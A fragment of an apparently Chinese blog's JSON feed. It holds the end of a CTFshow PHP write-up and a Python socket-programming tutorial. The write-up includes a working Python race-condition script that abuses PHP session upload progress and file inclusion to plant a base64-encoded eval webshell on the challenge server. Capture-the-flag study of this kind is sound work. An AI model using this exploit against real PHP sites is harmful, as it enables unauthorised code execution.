class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">class_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$__CTFSHOW__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"class is exists!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$isVIP</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctf</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">FALSE</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctf</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"log\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里多加了一个 log，但是好像没啥太大影响</p>\n<pre><code>这个题一点点小坑__autoload()函数不是类里面的\n__autoload — 尝试加载未定义的类\n最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦\n原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用\n__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo\n接下来就去getshell啦\n</code></pre>\n<p>最后整个脚本</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>import io</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>import requests</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>import threading</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url = 'http://3b26945b-f942-4c30-8a18-9c796b82a7cc.challenge.ctf.show/?isVIP=1'</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>event = threading.Event()</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>def write(session):</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    data = &#123;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        'PHP_SESSION_UPLOAD_PROGRESS': 'aaaaaa<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/var/www/html/s.php\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>'</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    while True:</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        if event.is_set():</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            return</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        f = io.BytesIO(b'a' * 1024 * 10)</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        _ = session.post(url,cookies=&#123;'PHPSESSID': 'down'&#125;, data=data, files=&#123;'file': ('verysafe.txt', f)&#125;)</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>def read(session):</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    while True:</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        if event.is_set():</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            return</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        response = session.post(url, data=&#123;\"ctf\": \"/tmp/sess_down\"&#125;)</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        if 'aaaaaa' in response.text:</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            print(response.text)</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            event.set()</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        else:</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            print('retry')</pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>if __name__ == '__main__':</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    session = requests.session()</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    for i in range(30):</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        threading.Thread(target=write, args=(session,)).start()</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    for i in range(30):</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        threading.Thread(target=read, args=(session,)).start()</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    event.wait()</pre></td></tr></table></figure>",
            "tags": [
                "CTFshow",
                "php特性"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/02/01/Python%E7%BD%91%E7%BB%9C%E5%8C%96%E7%BC%96%E7%A8%8B/",
            "url": "https://blog.xcu.icu/2023/02/01/Python%E7%BD%91%E7%BB%9C%E5%8C%96%E7%BC%96%E7%A8%8B/",
            "title": "Python网络化编程",
            "date_published": "2023-01-31T16:00:00.000Z",
            "content_html": "<h2 id=\"网络架构\"><a class=\"anchor\" href=\"#网络架构\">#</a> 网络架构</h2>\n<h3 id=\"网络体系结构\"><a class=\"anchor\" href=\"#网络体系结构\">#</a> 网络体系结构</h3>\n<p>1.OSI 协议是由 ISO (国际标准化组织) 制定的，用于提供给开发者一个必须的、通用的概念以便开发完善、可以用来解释连接不同系统的框架。OSI 协议将网络体系结构划分为 7 层：应用层、表示层、会话层、传输层、网络层、数据链路层、物理层。<br />\n2.TCP/IP (Transmission Control Protocol/Internet Protocol，传输控制协议 / 网际协议) 体系结构是指能够在多个不同网络间实现的协议簇。TCP/IP 传输协议包含 4 层体系结构，应用层、传输层、网络层和网络接口层。</p>\n<p>主要分层级如下图所示：</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131173017627.png\" alt=\"image-20230131173017627\" /></p>\n<p>分成设计的好处：</p>\n<p>各层之间可以独立设计和实现，只要保证相邻层之间的调用规范和接口不变，便可以非常方便的灵活的改变各层内部实现方式，以进行优化和完成需求</p>\n<h3 id=\"应用层\"><a class=\"anchor\" href=\"#应用层\">#</a> 应用层</h3>\n<p>应用层定义了运行在不同系统上的应用程序如何相互传递报文</p>\n<ul>\n<li>DNS: 域名系统 (Domain Name System)，用来实现域名与 IP 地址的转换，运行在 UDP 之上，默认使用 53 端口:</li>\n<li>FTP: 文件传输协议 (File Transfer Protocol)，可以通过网络在不同平台之间实现文件的传输，是一种基于 TCP 的明文传输协议，默认工作在 21 端口；</li>\n<li>HTTP: 超文本传输协议 (HyperText Transfer Protocol)，运行于 TCP 之上，默认端口为 80:</li>\n<li>SMTP: 简单邮件传输协议 (Simple Mail Transfer Protoco)，建立在 TCP 的基础上，使用明文传递邮件和发送命令，默认使用 25 端口。</li>\n<li>TELNET: 远程登陆协议，运行于 TCP 之上，默认使用 23 端口。</li>\n</ul>\n<h3 id=\"传输层\"><a class=\"anchor\" href=\"#传输层\">#</a> 传输层</h3>\n<p>主要负责向两个主机中进程之间的通信提供服务。</p>\n<p>在网络中，每台主机系统都拥有一个唯一的 IP 地址，发送方根据接收方的 IP 地址，将消息发送到接收方。每个程序的运行在主机系统中都有唯一的端口号。只需要通过 IP 进行寻址确定的目标主机，再根据目标系统的端口号，就能够正确的将消息进行传递。</p>\n<p>网络层是根据网络地址将源结点发出的数据包传送到目的结点，而传输层则负责将数据可靠地传送到目标系统对应的端口。</p>\n<ul>\n<li>TCP: 为两台计算机之间提供面向连接、可靠的字节流服务。一台计算机发出的字节流无差错地发往网络上的其他计算机，由于其可靠的传输方式，故传输速度较慢。</li>\n<li>UDP: 是一个简单的面向数据报的传输层协议。提供的是非面向连接的、不可靠的数据流传输。UDP 在传输数据报前不用在客户和服务器之间建立一个连接，且没有超时重发等机制，故传输速度很快。</li>\n</ul>\n<h4 id=\"三次握手协议\"><a class=\"anchor\" href=\"#三次握手协议\">#</a> 三次握手协议</h4>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131212555640.png\" alt=\"image-20230131212555640\" /></p>\n<ol>\n<li>客户端送一个 SYN 包作为建立连接的请求等待确认应答。</li>\n<li>服务器接收到请求数据包后，发送 ACK 确认应答，发送 SYN 包请求连接。</li>\n<li>客户端针对 SYN 包发送 ACK 包确认应答。</li>\n</ol>\n<h3 id=\"网络层\"><a class=\"anchor\" href=\"#网络层\">#</a> 网络层</h3>\n<p>ip 运行与互联网，是网络互联的重要基础，通过 ip 地址来标识网络上的主机，在公开网络上或者局域网内部，必须使用不同的 ip 地址</p>\n<p>由于网络地址转换（NAT）和代理服务器等技术的广泛应用，不同内网之间的主机可以使用相同的公网 ip 地址。IP 地址与端口来共同标识网络上特定应用程序，俗称 Socket</p>\n<h3 id=\"网络接口层\"><a class=\"anchor\" href=\"#网络接口层\">#</a> 网络接口层</h3>\n<p>MAC 地址也称为网卡物理地址，具有唯一性，是一个 48 为的 2 进制</p>\n<h2 id=\"socket使用\"><a class=\"anchor\" href=\"#socket使用\">#</a> Socket 使用</h2>\n<h3 id=\"socket的编程简介\"><a class=\"anchor\" href=\"#socket的编程简介\">#</a> Socket 的编程简介</h3>\n<p>套接字 (Socket) 是计算机之间进行通信的一种约定。通过 Socket，一台计算机可以接收其他计算机的数据，也可以向其他计算机发送数据</p>\n<p>市面上多数的远程管理软件，大多数依赖 Socket 来实现特定功能的，其包括两个部分：运行在客户端的称为 ClientSocket，运行在服务端的称为 ServerSocket，其实现通信的过程如下所示：</p>\n<ol>\n<li>服务端先初始化 Socket，然后与端口绑定（bind），对端口进行监听（listen），等待客户端连接。</li>\n<li>客户端初始化一个 Socket，客户端的套接字必须首先指出服务端套接字的地址和端口号，然后向服务器端套接字提出连接请求（connect）。</li>\n<li>当服务器端套接字接受到客户端套接字的连接请求，响应客户端套戒字的请求，建立一个新的线程，把服务器端套接字的描述发给客户端，一旦客户端确认了此描述，由此连接成功</li>\n</ol>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131215351633.png\" alt=\"image-20230131215351633\" /></p>\n<h3 id=\"udp编程\"><a class=\"anchor\" href=\"#udp编程\">#</a> UDP 编程</h3>\n<p>UDP 属于无连接协议，编程的时候不需要建立连接，而是直接向接收方发送信息。UDP 不提供应答重传机制，无法保证数据一定能够到达目的地，下面是三种 UDP 编程常用的 socket 模块方法</p>\n<ol>\n<li>socket (family [,type [,proto]])：创建一个 Socket 对象，family 为 socket.AF_INET 表示使用 IPV4，socket.AF_INET6 表示使用 IPV6；type 为 SOCK_STREAM 表示使用 TCP，SOCK_DGRAM 表示使用 UDP</li>\n<li>sendto (string,address)：把 string 指定的内容发送给 adress 指定的地址（这里的 adress 是指 ip + 端口号）</li>\n<li>recvfrom (bufsize [,flags])：接受数据</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#server</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s<span class=\"token operator\">=</span>socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span>socket<span class=\"token punctuation\">.</span>SOCK_DGRAM<span class=\"token punctuation\">)</span><span class=\"token comment\">#调用 socket 函数初始化</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#print(s)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>s<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">8001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#指定 IP 和端口</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    data<span class=\"token punctuation\">,</span>addr<span class=\"token operator\">=</span>s<span class=\"token punctuation\">.</span>recvfrom<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#不断的接收数据</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> data<span class=\"token punctuation\">.</span>decode<span class=\"token operator\">==</span><span class=\"token string\">'exit'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>s<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#client</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> uuid</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>s<span class=\"token operator\">=</span>socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span>socket<span class=\"token punctuation\">.</span>SOCK_DGRAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_mac_adress</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    mac<span class=\"token operator\">=</span>uuid<span class=\"token punctuation\">.</span>UUID<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token operator\">=</span>uuid<span class=\"token punctuation\">.</span>getnode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">\":\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>mac<span class=\"token punctuation\">[</span>e<span class=\"token punctuation\">:</span>e<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> e <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>ip<span class=\"token operator\">=</span>socket<span class=\"token punctuation\">.</span>gethostbyname<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>gethostname<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#print (\"ip 的值：\",ip)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>mac<span class=\"token operator\">=</span>get_mac_adress<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#print (\"mac 的值\",mac)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>info<span class=\"token operator\">=</span><span class=\"token string\">\"ip addr:\"</span><span class=\"token operator\">+</span>ip<span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span><span class=\"token operator\">+</span><span class=\"token string\">\"mac addr:\"</span><span class=\"token operator\">+</span>mac</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#print(info)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>s<span class=\"token punctuation\">.</span>sendto<span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">8001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>s<span class=\"token punctuation\">.</span>sendto<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">8001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>s<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230201195704235.png\" alt=\"image-20230201195704235\" /></p>\n<h3 id=\"tcp编程\"><a class=\"anchor\" href=\"#tcp编程\">#</a> TCP 编程</h3>\n<p>通常用于可靠的数据传输场合，TCP 通常使用的 socket 模块如下：</p>\n<ul>\n<li>socket (family [,type [,proto]]): 创建一个 Socket 对象，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1maWFtaWx5c29ja2V0LW9vMXUuQUY=\">fiamily 为 socket.AF</span> INET 表示使用 IPV4，socket.AF_INET6 表示使用 IPV6; type 为 SOCK STREAM 表示使用 TCP，SOCK DGRAM 表示使用 UDP。</li>\n<li>connect (address): 连接远程主机:</li>\n<li>send (bytes [,flags]): 发送数据:</li>\n<li>recv (bufsizelflags]): 接收数据:</li>\n<li>bind (address): 绑定地址:</li>\n<li>listen (backlog): 开始监听，等待客户端连接，blacklog 排队数，backlog+1 表示允许的最大连接数:</li>\n<li>accept (): 响应客户端的请求，接收一个连接</li>\n</ul>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#Server</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span>socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">8001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>s<span class=\"token punctuation\">.</span>listen<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Listen at port: 8001\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>conn<span class=\"token punctuation\">,</span>addr <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>accept<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>conn<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    data <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Recv: '</span><span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    c <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'Input:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    conn<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token string\">'bye'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>conn<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>s<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#Client</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span>socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    s<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'127.0.0.1'</span><span class=\"token punctuation\">,</span><span class=\"token number\">8001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> q<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Error!!!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    c <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"input: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    s<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    data <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Recv:'</span><span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">'bye'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>s<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230201202218353.png\" alt=\"image-20230201202218353\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230201202227841.png\" alt=\"image-20230201202227841\" /></p>\n<h3 id=\"扩展\"><a class=\"anchor\" href=\"#扩展\">#</a> 扩展</h3>\n<p>下表还列举了一些常用函数</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">函数</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">服务器端套接字</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.bind()</td>\n<td style=\"text-align:left\">绑定地址（host,port）到套接字， 在 AF_INET 下，以元组（host,port）的形式表示地址。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.listen()</td>\n<td style=\"text-align:left\">开始 TCP 监听。backlog 指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为 1，大部分应用程序设为 5 就可以了。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">s.accept()</td>\n<td style=\"text-align:left\">被动接受 TCP 客户端连接，(阻塞式) 等待连接的到来</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">客户端套接字</td>\n<td 